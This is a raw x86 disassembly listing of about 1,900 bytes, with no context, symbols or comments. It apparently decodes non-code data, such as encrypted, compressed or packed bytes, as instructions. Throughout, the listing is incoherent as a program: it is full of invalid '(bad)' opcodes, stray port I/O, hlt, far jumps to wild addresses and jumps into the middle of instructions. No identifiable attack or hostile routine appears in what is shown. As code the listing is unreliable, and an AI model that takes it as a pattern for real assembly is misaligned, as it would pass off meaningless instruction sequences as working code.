  410189:	mov    esp,DWORD PTR [eax-0x73]
  41018c:	jmp    0x389a0d7b
  410191:	dec    ecx
  410192:	mov    ds:0x6dadd3ba,al
  410197:	fwait
  410198:	inc    ebx
  410199:	push   ds
  41019a:	push   esp
  41019b:	mov    gs,WORD PTR [ecx-0x59]
  41019e:	push   edi
  41019f:	jle    0x410198
  4101a1:	or     DWORD PTR [ecx*4+0x79cb1a75],edi
  4101a8:	push   ebp
  4101a9:	jge    0x410154
  4101ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101ac:	xor    bh,0x1e
  4101af:	and    dh,BYTE PTR [ebx-0x63b66945]
  4101b5:	xchg   esp,eax
  4101b6:	or     ch,BYTE PTR [edi]
  4101b8:	inc    ebx
  4101b9:	push   cs
  4101ba:	add    BYTE PTR [eax+edx*2+0x5686888],ch
  4101c1:	mov    bl,0x96
  4101c3:	loope  0x4101d4
  4101c5:	je     0x410164
  4101c7:	add    dl,BYTE PTR [esi+0x44f9b502]
  4101cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4101ce:	inc    ebx
  4101cf:	shl    edi,1
  4101d1:	mov    DWORD PTR [eax-0x6115cbfd],0xf1344b09
  4101db:	mov    edx,0xc49f9643
  4101e0:	mov    BYTE PTR [esi+0xa72280b],ch
  4101e6:	mov    ecx,0x7bdcd91
  4101eb:	jns    0x41024e
  4101ed:	into   
  4101ee:	popa   
  4101ef:	sub    DWORD PTR ds:0xf78a77bf,ebx
  4101f5:	push   esi
  4101f6:	fs jl  0x41020a
  4101f9:	xchg   edx,eax
  4101fa:	pop    ds
  4101fb:	dec    esp
  4101fc:	bound  edx,QWORD PTR es:[edx+0x6b]
  410200:	aas    
  410201:	sahf   
  410202:	dec    edi
  410203:	xchg   ebx,eax
  410204:	dec    esi
  410205:	jbe    0x4101cf
  410207:	pop    edi
  410208:	inc    esi
  410209:	push   es
  41020a:	outs   dx,BYTE PTR ds:[esi]
  41020b:	jl     0x4101ef
  41020d:	es sub eax,0x27117922
  410213:	cld    
  410214:	repz jg 0x4101eb
  410217:	repnz (bad) 
  41021a:	shl    DWORD PTR [ebx-0x4a],1
  41021d:	mov    edx,0xdac734ec
  410222:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410223:	dec    esp
  410224:	test   eax,0xd4840374
  410229:	mov    al,ds:0xb7a04d92
  41022e:	mov    dh,0x9a
  410230:	inc    esp
  410231:	(bad)  
  410232:	pop    ss
  410233:	fadd   DWORD PTR [eax-0x1b1be32]
  410239:	popf   
  41023a:	inc    ebx
  41023b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41023c:	mov    ch,0xfd
  41023e:	pop    ebx
  41023f:	mov    ecx,0x94baaba2
  410244:	lods   al,BYTE PTR ds:[esi]
  410245:	mov    al,0x74
  410247:	mov    al,0x1c
  410249:	adc    BYTE PTR [esi],al
  41024b:	repz sub al,0x4c
  41024e:	mov    esi,gs
  410250:	popa   
  410251:	hlt    
  410252:	mov    dl,0x36
  410254:	mov    ebp,0x1dea490d
  410259:	pop    esp
  41025a:	je     0x410244
  41025c:	sub    BYTE PTR [ebp-0x26],0x5d
  410260:	or     eax,0xa4b879a6
  410265:	add    BYTE PTR [esi-0x60],0x1e
  410269:	or     bl,BYTE PTR [ebp-0x5b360eed]
  41026f:	ror    BYTE PTR [ebx],1
  410271:	sbb    dl,BYTE PTR [esi]
  410273:	pop    ds
  410274:	repnz les esp,FWORD PTR [esi-0x1c13eb5]
  41027b:	push   ebp
  41027c:	js     0x41028f
  41027e:	mov    eax,0x855de4d
  410283:	dec    edx
  410284:	(bad)
  410288:	inc    eax
  410289:	aaa    
  41028a:	jle    0x4102d5
  41028c:	push   ebx
  41028d:	jecxz  0x410248
  41028f:	arpl   WORD PTR [edx+0x12],si
  410292:	mov    esi,0x45da2867
  410297:	push   cs
  410298:	outs   dx,BYTE PTR ds:[esi]
  410299:	sahf   
  41029a:	dec    ecx
  41029b:	mov    ss:0xb1d1470a,al
  4102a1:	imul   esp,ebp,0x6e
  4102a4:	add    ebx,ecx
  4102a6:	data16 cmp BYTE PTR fs:[edi+0x7a],ah
  4102ab:	pop    ds
  4102ac:	in     eax,dx
  4102ad:	stos   BYTE PTR es:[edi],al
  4102ae:	sub    DWORD PTR ds:0x50392254,ebp
  4102b4:	fwait
  4102b5:	dec    BYTE PTR [edx]
  4102b7:	push   0x1c
  4102b9:	test   eax,0xf1ea3432
  4102be:	les    esp,FWORD PTR [esp+esi*8]
  4102c1:	add    bl,cl
  4102c3:	sbb    edi,0x30e3e623
  4102c9:	mov    bh,BYTE PTR [ebp+0x35af4fae]
  4102cf:	aas    
  4102d0:	mov    ds:0x61977a48,eax
  4102d5:	push   esi
  4102d6:	push   esp
  4102d7:	das    
  4102d8:	lods   eax,DWORD PTR ds:[esi]
  4102d9:	ret    0x48a1
  4102dc:	fidiv  WORD PTR [ecx]
  4102de:	lea    ebp,[ecx+0x28]
  4102e1:	call   0x543ae66f
  4102e6:	push   0xffffff8b
  4102e8:	sbb    DWORD PTR [edi],esi
  4102ea:	retf   0xfe51
  4102ed:	push   ecx
  4102ee:	xor    eax,0xe2d2cd62
  4102f3:	(bad)  
  4102f4:	sub    eax,0x24f956af
  4102f9:	mov    edi,0xba50552d
  4102fe:	mov    dh,0xa8
  410300:	push   edi
  410301:	sbb    bl,bh
  410303:	loop   0x41029a
  410305:	push   ebp
  410306:	retf   
  410307:	arpl   WORD PTR [ebp+0x54cf52e9],ax
  41030d:	mov    ebp,0x7f7bb5c0
  410312:	push   esi
  410313:	sub    ebp,esi
  410315:	jo     0x410301
  410317:	jno    0x410306
  410319:	cmp    eax,0x364887ee
  41031e:	arpl   WORD PTR [ebp+0x27],bp
  410321:	(bad)  
  410322:	out    dx,eax
  410323:	fwait
  410324:	in     al,dx
  410325:	mov    eax,0x7064ff47
  41032a:	shl    DWORD PTR [eax],1
  41032c:	push   cs
  41032d:	push   cs
  41032e:	jge    0x410308
  410330:	ins    BYTE PTR es:[edi],dx
  410331:	or     eax,DWORD PTR ds:0x3120ca47
  410337:	xor    ch,BYTE PTR [ecx+esi*2+0x23]
  41033b:	lock or ebp,eax
  41033e:	sbb    ah,BYTE PTR [eax]
  410340:	jo     0x4102dc
  410342:	shl    BYTE PTR [ebp-0x33],0x45
  410346:	ins    DWORD PTR es:[edi],dx
  410347:	js     0x4103b7
  410349:	sti    
  41034a:	out    dx,eax
  41034b:	xchg   ecx,eax
  41034c:	add    al,0x23
  41034e:	int3   
  41034f:	je     0x410317
  410351:	dec    ebx
  410352:	mov    ah,BYTE PTR [ebx]
  410354:	mov    al,ds:0x1a4bfee0
  410359:	out    0xd9,eax
  41035b:	call   esp
  41035d:	inc    ebx
  41035e:	in     eax,0x1
  410360:	inc    edi
  410361:	inc    ecx
  410362:	scas   al,BYTE PTR es:[edi]
  410363:	dec    eax
  410364:	xor    al,0x9a
  410366:	add    dh,dh
  410368:	mov    ebp,0xf32e28a1
  41036d:	in     al,dx
  41036e:	daa    
  41036f:	push   es
  410370:	sbb    DWORD PTR [esi+ebp*1],ebp
  410373:	jnp    0x98d10e38
  410379:	je     0x41037a
  41037b:	push   ecx
  41037c:	push   edi
  41037d:	in     eax,0x9c
  41037f:	inc    ebx
  410380:	jnp    0x4103db
  410382:	rcl    DWORD PTR [edi+0x7975ef71],1
  410388:	daa    
  410389:	cmp    BYTE PTR [eax+ebx*2],0xd8
  41038d:	in     al,0xac
  41038f:	repz shl DWORD PTR [edx+ebp*2],1
  410393:	mov    esp,0xfc37b6ca
  410398:	mov    al,0xd8
  41039a:	retf   0xbfc8
  41039d:	enter  0xcc43,0xc4
  4103a1:	je     0x41040e
  4103a3:	mov    cs,edx
  4103a5:	mov    cl,0x78
  4103a7:	jle    0x41040f
  4103a9:	mov    dh,0x7b
  4103ab:	retf   0x5f72
  4103ae:	(bad)  
  4103af:	push   esi
  4103b0:	xchg   ebp,eax
  4103b1:	aaa    
  4103b2:	in     al,0xc8
  4103b4:	xchg   esp,eax
  4103b5:	stos   DWORD PTR es:[edi],eax
  4103b6:	inc    edi
  4103b7:	xor    DWORD PTR [esi-0x66],ebx
  4103ba:	add    ch,BYTE PTR [eax-0x21]
  4103bd:	push   ebx
  4103be:	or     al,0x76
  4103c0:	pushf  
  4103c1:	sbb    DWORD PTR [eax],ebx
  4103c3:	xor    al,0x2d
  4103c5:	rcr    DWORD PTR [esi],1
  4103c7:	or     eax,0x6fae40ed
  4103cc:	stc    
  4103cd:	and    al,0x35
  4103cf:	shl    BYTE PTR [edi-0x2b],1
  4103d2:	xchg   BYTE PTR [edi-0x40],bl
  4103d5:	dec    esi
  4103d6:	test   al,0xdc
  4103d8:	retf   0x6257
  4103db:	or     DWORD PTR [eax+0x2],edx
  4103de:	in     eax,dx
  4103df:	in     eax,dx
  4103e0:	lods   eax,DWORD PTR ds:[esi]
  4103e1:	jbe    0x4103c8
  4103e3:	sti    
  4103e4:	jns    0x41036f
  4103e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4103e7:	sub    DWORD PTR [ecx-0x6c],edx
  4103ea:	or     BYTE PTR [edx-0x342290f4],dl
  4103f0:	push   ss
  4103f1:	clc    
  4103f2:	xchg   esp,eax
  4103f3:	pop    eax
  4103f4:	push   ds
  4103f5:	cli    
  4103f6:	(bad)  [ebx+0x20]
  4103f9:	jge    0x41043c
  4103fb:	fucom  st(1)
  4103fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4103fe:	dec    esi
  4103ff:	movaps xmm0,XMMWORD PTR [edi-0xc6afe8c]
  410406:	jae    0x410470
  410408:	stc    
  410409:	jns    0x4103c7
  41040b:	or     BYTE PTR [esp+edi*4-0x22e8df14],cl
  410412:	and    eax,0xa3153a15
  410417:	xor    edi,DWORD PTR [ebp-0x10]
  41041a:	sahf   
  41041b:	arpl   WORD PTR [edi+0xade2cf7],ax
  410421:	mov    bl,0xcc
  410423:	ss mov edi,0x87562ca4
  410429:	rcl    DWORD PTR [eax],0x92
  41042c:	ins    DWORD PTR es:[edi],dx
  41042d:	jmp    0x99b0:0x675a9041
  410434:	inc    edi
  410435:	int    0xc0
  410437:	fdiv   st,st(1)
  410439:	push   0xffffff90
  41043b:	jmp    FWORD PTR [edi+0x3b]
  41043e:	cs dec esi
  410440:	xlat   BYTE PTR ds:[ebx]
  410441:	test   BYTE PTR [ebx],0xd5
  410444:	jp     0x4104a2
  410446:	jns    0x410415
  410448:	loope  0x4103e2
  41044a:	and    al,0xcc
  41044c:	adc    ch,dl
  41044e:	sub    BYTE PTR [eax+0x3aef78d1],0xef
  410455:	sub    DWORD PTR [esi+0x7d307521],ecx
  41045b:	aas    
  41045c:	xchg   esp,eax
  41045d:	js     0x410436
  41045f:	cmp    ecx,DWORD PTR [edx-0x12]
  410462:	pop    edi
  410463:	shl    bl,cl
  410465:	inc    eax
  410466:	fistp  DWORD PTR [ebp+0x58889bea]
  41046c:	repnz and al,0x9e
  41046f:	sti    
  410470:	sub    eax,0x77f3284a
  410475:	jne    0x410463
  410477:	ss rcr esp,1
  41047a:	cdq    
  41047b:	fiadd  DWORD PTR [ecx]
  41047d:	das    
  41047e:	jg     0x4104ab
  410480:	outs   dx,DWORD PTR ds:[esi]
  410481:	jns    0x4104d8
  410483:	ins    BYTE PTR es:[edi],dx
  410484:	cmc    
  410485:	dec    ecx
  410486:	les    edx,FWORD PTR [edx+0x65242a8e]
  41048c:	bnd ja 0x41044e
  41048f:	mov    cl,0x9d
  410491:	cld    
  410492:	add    DWORD PTR [esi+0x16],eax
  410495:	inc    esi
  410496:	fistp  QWORD PTR [ebx+eiz*8+0x70]
  41049a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41049b:	rcl    edx,0x1a
  41049e:	jle    0x410503
  4104a0:	sub    DWORD PTR [edi],ebx
  4104a2:	xchg   ecx,eax
  4104a3:	and    BYTE PTR [ebx-0x160e2b01],cl
  4104a9:	inc    ebx
  4104aa:	in     al,dx
  4104ab:	std    
  4104ac:	inc    esi
  4104ad:	jns    0x410471
  4104af:	xchg   edx,eax
  4104b0:	mov    al,ds:0x993cbaea
  4104b5:	int    0x1f
  4104b7:	mov    ch,0xbb
  4104b9:	mov    ds:0x30022df4,al
  4104be:	ds popa 
  4104c0:	adc    eax,0x1b388857
  4104c5:	(bad)  
  4104c6:	std    
  4104c7:	addr16 mov ?,ecx
  4104ca:	lahf   
  4104cb:	mov    edi,es
  4104cd:	pop    esp
  4104ce:	prefetch (bad)
  4104cf:	or     eax,0x9df9ebdf
  4104d4:	inc    ebp
  4104d5:	mov    bl,0x75
  4104d7:	xchg   edx,eax
  4104d8:	std    
  4104d9:	xor    edi,DWORD PTR [ebx+0x52c54e48]
  4104df:	sub    al,0x2f
  4104e1:	retf   
  4104e2:	mov    esi,0xc5084194
  4104e7:	dec    edx
  4104e8:	mov    ebx,DWORD PTR [eax]
  4104ea:	inc    esp
  4104eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4104ec:	xchg   esp,eax
  4104ed:	pop    es
  4104ee:	pushf  
  4104ef:	stos   BYTE PTR es:[edi],al
  4104f0:	push   0x37aa7e31
  4104f5:	call   FWORD PTR [esi+ebx*8]
  4104f8:	sahf   
  4104f9:	(bad)  
  4104fa:	imul   eax,DWORD PTR [edx],0x24
  4104fd:	arpl   bp,dx
  4104ff:	std    
  410500:	lahf   
  410501:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410502:	repz or BYTE PTR [esi-0x42a6c531],bh
  410509:	push   ds
  41050a:	aaa    
  41050b:	xchg   BYTE PTR [ecx+0x33],bl
  41050e:	sub    eax,0xeab984fc
  410513:	inc    edx
  410514:	inc    edx
  410515:	mov    dh,0xb4
  410517:	mov    esp,0xd014509e
  41051c:	data16 add al,0xa4
  41051f:	loopne 0x4104c1
  410521:	dec    esi
  410522:	or     ah,BYTE PTR [ebp-0x51e2ea8]
  410528:	push   edx
  410529:	xor    DWORD PTR [eax],edi
  41052b:	test   al,0xaa
  41052d:	ja     0x410505
  41052f:	pop    edx
  410530:	add    esi,DWORD PTR [eax]
  410532:	mov    al,0x6f
  410534:	pop    ss
  410535:	ret    0xff9
  410538:	pop    eax
  410539:	in     eax,dx
  41053a:	lods   al,BYTE PTR ds:[esi]
  41053b:	lock out 0x85,eax
  41053e:	aas    
  41053f:	xchg   esp,eax
  410540:	adc    DWORD PTR [eax],edx
  410542:	jne    0x41058d
  410544:	jo     0x41054e
  410546:	outs   dx,DWORD PTR ds:[esi]
  410547:	adc    al,BYTE PTR [edi+eax*8+0x6d]
  41054b:	jmp    0x5844:0xe75d553b
  410552:	in     eax,dx
  410553:	pop    es
  410554:	pop    ecx
  410555:	xlat   BYTE PTR ds:[ebx]
  410556:	fstp   DWORD PTR [ebx+0x6dd10034]
  41055c:	jg     0x41055d
  41055e:	call   0x71de4e9b
  410563:	les    esp,FWORD PTR [esi]
  410565:	dec    esi
  410566:	sbb    BYTE PTR [ebp+0x795597e8],0x60
  41056d:	cmp    ebp,0xffffffa1
  410570:	outs   dx,DWORD PTR ds:[esi]
  410571:	loop   0x410596
  410573:	push   ds
  410574:	inc    eax
  410575:	jge    0x410589
  410577:	clc    
  410578:	jnp    0x41057c
  41057a:	dec    eax
  41057b:	cmp    ebp,DWORD PTR [edx-0x49]
  41057e:	loopne 0x410529
  410580:	cmp    DWORD PTR [esi+ecx*8-0x6c],ebx
  410584:	mov    ecx,0x1d9fbc46
  410589:	mov    dh,0xd0
  41058b:	sbb    DWORD PTR [ebp-0x59be1bed],edx
  410591:	lds    esi,FWORD PTR [edx]
  410593:	add    DWORD PTR ds:0x4cc343c9,0x3b542748
  41059d:	lahf   
  41059e:	sar    DWORD PTR [esi+0x29],cl
  4105a1:	scas   eax,DWORD PTR es:[edi]
  4105a2:	stos   DWORD PTR es:[edi],eax
  4105a3:	push   esp
  4105a4:	mov    ebx,?
  4105a6:	push   esp
  4105a7:	inc    edx
  4105a8:	dec    esp
  4105a9:	pop    esi
  4105aa:	jl     0x4105ba
  4105ac:	das    
  4105ad:	in     al,dx
  4105ae:	adc    al,0x1a
  4105b0:	push   esi
  4105b1:	fnsave [ebx]
  4105b3:	xchg   esp,eax
  4105b4:	ds push edx
  4105b6:	fild   WORD PTR ds:0xa2c96fd7
  4105bc:	dec    esi
  4105bd:	lea    esp,[esp+eax*1]
  4105c0:	mov    edx,0xa3887890
  4105c5:	cmp    al,0xdb
  4105c7:	jge    0x4105cc
  4105c9:	pop    ss
  4105ca:	lods   eax,DWORD PTR ds:[esi]
  4105cb:	or     DWORD PTR [ecx-0x18],ecx
  4105ce:	push   ebp
  4105cf:	jns    0x410552
  4105d1:	xchg   DWORD PTR ds:0xc5e23dfe,ecx
  4105d7:	out    0x3,eax
  4105d9:	ret    0x40d8
  4105dc:	inc    ebp
  4105dd:	arpl   WORD PTR [edx],si
  4105df:	dec    ebp
  4105e0:	arpl   WORD PTR [ebx+0x6e9a5a29],sp
  4105e6:	add    al,0x28
  4105e8:	nop
  4105e9:	pop    esi
  4105ea:	jge    0x410629
  4105ec:	fwait
  4105ed:	or     DWORD PTR ds:0x25c5dc51,edi
  4105f3:	adc    edi,DWORD PTR [edx-0x1aa7f980]
  4105f9:	fs sbb al,0x38
  4105fc:	xchg   ebx,eax
  4105fd:	push   eax
  4105fe:	in     al,dx
  4105ff:	(bad)  
  410600:	rcl    BYTE PTR [ecx+0x7],cl
  410603:	mov    eax,0x7b769bc
  410608:	scas   al,BYTE PTR es:[edi]
  410609:	inc    eax
  41060a:	sbb    edi,DWORD PTR [esi+0x2b33da81]
  410610:	loope  0x41060c
  410612:	retf   
  410613:	nop
  410614:	pop    ebp
  410615:	icebp  
  410616:	jae    0x4105a7
  410618:	sahf   
  410619:	aas    
  41061a:	xor    BYTE PTR gs:[eax-0x38],ah
  41061e:	loop   0x410697
  410620:	sbb    DWORD PTR ds:0x33a78128,esi
  410626:	cld    
  410627:	mov    al,0xa0
  410629:	dec    eax
  41062a:	pop    ds
  41062b:	cmp    eax,0x5e1af984
  410630:	outs   dx,DWORD PTR ds:[esi]
  410631:	add    BYTE PTR [edx-0x3abe8aba],dl
  410637:	mov    ebp,0x67b4defe
  41063c:	sbb    BYTE PTR [esi-0x524033ba],bh
  410642:	cdq    
  410643:	dec    eax
  410644:	jno    0x4105fc
  410646:	jge    0x41068a
  410648:	jnp    0x410601
  41064a:	inc    edi
  41064b:	cmp    al,0xcf
  41064d:	pop    ds
  41064e:	retf   0xede1
  410651:	fisttp DWORD PTR [ebx-0x65]
  410654:	leave  
  410655:	test   eax,0xd2cc59e7
  41065a:	fist   DWORD PTR ss:[eax+0x54]
  41065e:	das    
  41065f:	pop    esp
  410660:	sub    ebp,esi
  410662:	xor    dl,BYTE PTR [eax-0xf26b64f]
  410668:	adc    bl,BYTE PTR [ebx]
  41066a:	push   eax
  41066b:	fld    TBYTE PTR [edx-0x2ef1a406]
  410671:	sub    eax,DWORD PTR [ebp+0x61bb8326]
  410677:	fistp  DWORD PTR [ecx-0x2fb25238]
  41067d:	dec    ebp
  41067e:	xor    al,0xac
  410680:	jno    0x4106cb
  410682:	push   0xffffffc8
  410684:	inc    ecx
  410685:	sub    dl,BYTE PTR [ebp-0x603122b8]
  41068b:	ret    0x9504
  41068e:	or     BYTE PTR [esp+edx*1+0x6d],ch
  410692:	neg    DWORD PTR [esi+0x4b]
  410695:	sub    ebp,DWORD PTR [esi-0x463f434c]
  41069b:	cdq    
  41069c:	enter  0x4d59,0x7a
  4106a0:	(bad)  
  4106a1:	loop   0x41071e
  4106a3:	or     DWORD PTR [edx],ecx
  4106a5:	mov    eax,0xc9c0eae4
  4106aa:	push   ss
  4106ab:	jmp    0x410705
  4106ad:	jg     0x410648
  4106af:	mov    cl,0x6
  4106b1:	cmp    al,0x15
  4106b3:	pop    esi
  4106b5:	mov    cl,0x48
  4106b7:	scas   eax,DWORD PTR es:[edi]
  4106b8:	fld    QWORD PTR [ecx+0x4f031f6b]
  4106be:	cmp    ebp,DWORD PTR [ebx-0x6a]
  4106c1:	arpl   WORD PTR [edx-0x33],sp
  4106c4:	ja     0x4106db
  4106c6:	jmp    0x41064d
  4106c8:	add    al,0x32
  4106ca:	(bad)  
  4106cb:	sub    al,0x81
  4106ce:	ins    DWORD PTR es:[edi],dx
  4106cf:	adc    al,0x71
  4106d1:	cmp    ebx,DWORD PTR [esp+eiz*2+0x50c43b00]
  4106d8:	xor    BYTE PTR [eax],dh
  4106da:	in     eax,0x94
  4106dc:	rcl    ebp,0xa7
  4106df:	fsin   
  4106e1:	and    esp,DWORD PTR [ebx]
  4106e3:	jmp    0xe9ce1ebc
  4106e8:	test   DWORD PTR [ebp+0x70],edi
  4106eb:	dec    edi
  4106ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4106ed:	aam    0x3e
  4106ef:	or     ah,BYTE PTR ds:0x67637e56
  4106f5:	retf   0xaa32
  4106f8:	imul   eax,ecx,0x1440e81e
  4106fe:	in     eax,0x0
  410700:	repnz scas al,BYTE PTR es:[edi]
  410702:	cli    
  410703:	cmp    dh,BYTE PTR [ebx+0x29]
  410706:	ja     0x41069a
  410708:	fs or  eax,0x26bd1f77
  41070e:	inc    esp
  41070f:	xchg   esi,eax
  410710:	xor    BYTE PTR [edx-0x9],cl
  410713:	ret    
  410714:	outs   dx,DWORD PTR ds:[esi]
  410715:	lahf   
  410716:	out    0xba,eax
  410718:	add    ebp,DWORD PTR [esi-0x7cfefe97]
  41071e:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410720:	xor    ebp,0xab0ef824
  410726:	fs pop eax
  410728:	in     eax,dx
  410729:	pop    eax
  41072a:	fiadd  WORD PTR [ebx]
  41072c:	call   FWORD PTR [ecx-0x7407a020]
  410732:	and    ecx,edx
  410734:	test   DWORD PTR [ebp+ecx*1+0x5],esi
  410738:	fld    st(5)
  41073a:	cmp    eax,0x12cd06d1
  41073f:	loopne 0x4107ae
  410741:	mov    al,0x64
  410743:	jae    0x410781
  410745:	gs inc edi
  410747:	and    edi,DWORD PTR [ecx+0x7d3c1d78]
  41074d:	dec    ebp
  41074e:	sub    esi,DWORD PTR [eax+0x52567263]
  410754:	retf   
  410755:	jnp    0x410770
  410757:	xor    eax,0x5dffc66f
  41075c:	outs   dx,DWORD PTR ds:[esi]
  41075d:	mov    ds:0xb0ef66c2,eax
  410762:	mov    WORD PTR [esi],?
  410764:	not    DWORD PTR [edx]
  410766:	shl    BYTE PTR [esi+ebp*4+0x4b8fffe0],cl
  41076d:	mov    bl,0x38
  41076f:	jo     0x4107d8
  410771:	lahf   
  410772:	je     0x410769
  410774:	std    
  410775:	sbb    DWORD PTR [edi*1-0x1d3ec907],edi
  41077c:	mov    esi,0xc69dac37
  410781:	mov    DWORD PTR [esi+0x1f],esi
  410784:	inc    esp
  410785:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410786:	push   ds
  410787:	rcl    BYTE PTR [ebp+0x55cfef91],0xfe
  41078e:	adc    ch,bl
  410790:	sub    al,BYTE PTR [edi+0x16]
  410793:	xor    BYTE PTR [ecx-0x72d967a6],ah
  410799:	and    BYTE PTR [edi-0x1b9f13a1],bh
  41079f:	mov    ecx,0x18c877b9
  4107a4:	jnp    0x410801
  4107a6:	add    al,BYTE PTR [ebx]
  4107a8:	xor    al,BYTE PTR [ebx+0x5f]
  4107ab:	add    eax,0x8c2733e2
  4107b0:	mov    ebx,DWORD PTR [ebx]
  4107b2:	sub    eax,0xb5aab1d5
  4107b7:	jle    0x410794
  4107b9:	outs   dx,BYTE PTR ds:[esi]
  4107ba:	inc    esi
  4107bb:	clc    
  4107bc:	adc    BYTE PTR [edi],al
  4107be:	jge    0x4107f4
  4107c0:	jnp    0x4107a3
  4107c2:	pop    ebx
  4107c3:	pop    ds
  4107c4:	xchg   cl,cl
  4107c6:	repz test eax,0xef1f77f
  4107cc:	shl    edi,cl
  4107ce:	adc    ebp,eax
  4107d0:	retw   0xdf90
  4107d4:	xor    dh,ah
  4107d6:	mov    ds:0xf6d83cfd,eax
  4107db:	pop    edi
  4107dc:	les    ebp,FWORD PTR [ebp+0x6]
  4107df:	lods   eax,DWORD PTR ds:[esi]
  4107e0:	ret    
  4107e1:	dec    esi
  4107e2:	leave  
  4107e3:	push   0x67
  4107e5:	add    DWORD PTR [ebx],edi
  4107e7:	dec    edi
  4107e8:	pop    eax
  4107e9:	mov    ecx,0x618855a5
  4107ee:	pusha  
  4107ef:	ja     0x4107aa
  4107f1:	pop    esi
  4107f2:	adc    esp,DWORD PTR [ebp-0x70]
  4107f5:	ins    BYTE PTR es:[edi],dx
  4107f6:	jbe    0x41082f
  4107f8:	test   DWORD PTR [ecx],0xbc5fa09a
  4107fe:	sbb    esi,ebx
  410800:	(bad)  
  410801:	je     0x41085f
  410803:	adc    eax,0x614e66a3
  410808:	fisub  WORD PTR [esi-0x655878c1]
  41080e:	aaa    
  41080f:	adc    al,0xf5
  410811:	pop    ss
  410812:	sub    edi,ebp
  410814:	xchg   esi,eax
  410815:	adc    dh,BYTE PTR [eax+0x5e0b7c7c]
  41081b:	xlat   BYTE PTR ds:[ebx]
  41081c:	ds ret 
  41081e:	scas   al,BYTE PTR es:[edi]
  41081f:	jmp    0xcdd1:0x4a1a6609
  410826:	ja     0x41081c
  410828:	push   edi
  41082a:	je     0x41084f
  41082c:	outs   dx,BYTE PTR ds:[esi]
  41082d:	mov    dl,dh
  41082f:	add    edi,DWORD PTR [ecx+esi*8]
  410832:	dec    ebp
  410833:	or     al,0x1
  410835:	ds in  al,dx
  410837:	push   edi
  410838:	sbb    al,0x2b
  41083a:	dec    edi
  41083b:	jb     0x410868
  41083d:	pop    ecx
  41083e:	nop
  41083f:	imul   ebx,DWORD PTR [ebp+0x63ea1900],0xfffffff5
  410846:	fld    DWORD PTR [ecx+0x4a99b030]
  41084c:	mov    dh,al
  41084e:	das    
  41084f:	loope  0x4108ae
  410851:	cli    
  410852:	inc    eax
  410853:	fist   DWORD PTR [ebx]
  410855:	pop    ecx
  410856:	ins    BYTE PTR es:[edi],dx
  410857:	das    
  410858:	icebp  
  410859:	test   DWORD PTR [ebx+eiz*2+0x59],ebp
  41085d:	mov    edx,0x93e83121
  410862:	fcmove st,st(2)
  410864:	and    cl,BYTE PTR [eax-0x4a]
  410867:	sbb    BYTE PTR [ebx+eiz*2],cl
  41086a:	sbb    al,0x29
  41086c:	mov    dl,0xd0
  41086e:	add    eax,0x25a8407d
  410873:	lahf   
  410874:	fisttp QWORD PTR [ecx-0x41]
  410877:	mov    ecx,0xc490f208
  41087c:	enter  0x2e73,0xdb
  410880:	int3   
  410881:	xor    al,0xe3
  410883:	outs   dx,BYTE PTR ds:[esi]
  410884:	imul   BYTE PTR [edi-0x39d1c0ad]
  41088a:	mov    cl,0xde
  41088c:	loope  0x4108b3
  41088e:	pusha  
  41088f:	inc    edi
  410890:	scas   eax,DWORD PTR es:[edi]
  410891:	je     0x410902
  410893:	pop    eax
  410894:	int3   
  410895:	cmp    al,0xce
  410897:	dec    dl
  410899:	cmp    al,0x4a
  41089b:	or     eax,0x663d89f1
  4108a0:	sbb    ah,BYTE PTR ds:0x9b244655
  4108a6:	not    BYTE PTR [eax+0x5f]
  4108a9:	rcr    ecx,0xf4
  4108ac:	arpl   WORD PTR [ecx+0x5],cx
  4108af:	out    dx,eax
  4108b0:	mov    eax,0x63bd9698
  4108b5:	ret    0x59e9
  4108b8:	dec    ecx
  4108b9:	(bad)  
  4108ba:	push   ds
  4108bb:	dec    ebx
  4108bc:	mov    cl,0x33
  4108be:	loopne 0x4108f0
  4108c0:	pop    ebx
  4108c1:	sub    al,0x34
  4108c3:	push   eax
  4108c4:	out    dx,eax
  4108c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4108c6:	mov    eax,0x5e305fa2
  4108cb:	cld    
  4108cc:	push   ds
  4108cd:	dec    DWORD PTR [ebx+0xf]
  4108d0:	and    bh,BYTE PTR [eax-0x51]
  4108d3:	test   al,0xc
  4108d5:	bound  edi,QWORD PTR [ecx+edi*2]
  4108d8:	jns    0x4108bd
  4108da:	leave  
  4108db:	rcr    esp,cl
  4108dd:	sub    eax,0xbb40d91
  4108e2:	fcomip st,st(3)
  4108e4:	sbb    eax,0x8be9b8b3
  4108e9:	out    0x40,eax
  4108eb:	dec    ebx
  4108ec:	scas   eax,DWORD PTR es:[edi]
  4108ed:	shl    BYTE PTR [edi-0x30],cl
  4108f0:	adc    eax,0xb18e9930
  4108f5:	add    eax,0xd87289
  4108fa:	dec    eax
  4108fb:	fild   DWORD PTR [edi-0x70]
  4108fe:	mov    al,0xe
  410900:	pop    ecx
  410901:	popf   
  410902:	fdivr  DWORD PTR [edi-0x1c5a48fe]
  410908:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410909:	xor    al,0xaa
  41090b:	mov    ah,0x9
  41090d:	adc    DWORD PTR [edx+0x4a],eax
  410910:	pop    esi
  410911:	add    eax,ebp
  410913:	in     eax,0xda
  410915:	pop    ebp
  410916:	dec    esp
  410917:	out    dx,eax
  410918:	dec    edi
  410919:	push   edx
  41091a:	imul   ebx,DWORD PTR [eax+0xa9cd18d],0x5d
  410921:	enter  0x3815,0xd9
  410925:	pop    ebx
  410926:	adc    DWORD PTR [esi+0x62],esi
  410929:	add    BYTE PTR [ecx+0x53],cl
  41092c:	sub    al,0xa1
  41092e:	test   DWORD PTR ds:0xb17e98b2,0xe921861
  410938:	neg    BYTE PTR [ecx+0x7fb198]
  41093e:	dec    edi
  41093f:	test   eax,0x2cfd895e
